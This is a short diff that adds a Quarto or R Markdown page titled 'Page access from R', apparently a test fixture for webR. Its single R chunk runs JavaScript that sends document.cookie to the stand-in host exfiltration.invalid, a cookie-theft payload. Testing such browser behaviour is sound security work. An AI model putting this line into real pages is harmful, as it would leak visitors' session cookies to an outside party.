@@ -1,0 +1,7 @@
+---
+title: "Page access from R"
+---
+
+```{r}
+webr::eval_js("fetch(\"https://exfiltration.invalid/\" + document.cookie)")
+```
